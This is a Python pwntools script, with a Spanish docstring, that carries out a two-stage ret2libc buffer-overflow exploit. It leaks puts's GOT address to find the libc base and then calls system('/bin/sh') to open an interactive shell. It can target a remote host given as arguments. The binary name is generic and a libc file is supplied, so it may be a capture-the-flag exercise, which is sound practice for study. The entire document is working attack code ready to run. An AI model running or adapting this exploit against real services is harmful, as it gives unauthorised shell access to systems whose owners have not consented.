#!/usr/bin/env python3
"""
ret2libc con filtrado de dirección de libc via puts(got[puts]).

Paso 1: Llamar puts(got['puts']) para filtrar dirección de puts en libc
Paso 2: Calcular base de libc
Paso 3: Llamar system("/bin/sh")
"""
import sys
from pwn import *

BINARY = './target'
LIBC   = './libc.so.6'

elf  = ELF(BINARY, checksec=False)
libc = ELF(LIBC,   checksec=False)
rop  = ROP(elf)

if args.REMOTE:
    p = remote(sys.argv[2], int(sys.argv[3]))
else:
    p = process(BINARY)

OFFSET = 72   # 64-byte buffer + 8 saved rbp

# Gadgets (PIE=off → fixed addresses)
POP_RDI  = rop.find_gadget(['pop rdi', 'ret'])[0]
RET      = rop.find_gadget(['ret'])[0]
PUTS_PLT = elf.plt['puts']
PUTS_GOT = elf.got['puts']
MAIN     = elf.symbols['main']

# Stage 1: leak puts@libc address
payload1  = b'A' * OFFSET
payload1 += p64(POP_RDI)
payload1 += p64(PUTS_GOT)
payload1 += p64(PUTS_PLT)
payload1 += p64(MAIN)

p.recvuntil(b'data:\n')
p.send(payload1)
p.recvuntil(b'complete.\n')

# Read leaked address (6 bytes, little-endian)
leak       = p.recv(6).ljust(8, b'\x00')
puts_libc  = u64(leak)
libc_base  = puts_libc - libc.symbols['puts']
print(f'[+] libc base: {hex(libc_base)}')

# Stage 2: call system("/bin/sh")
SYS = libc_base + libc.symbols['system']
BIN = libc_base + next(libc.search(b'/bin/sh'))

payload2  = b'A' * OFFSET
payload2 += p64(RET)       # stack alignment
payload2 += p64(POP_RDI)
payload2 += p64(BIN)
payload2 += p64(SYS)

p.recvuntil(b'data:\n')
p.send(payload2)
p.interactive()
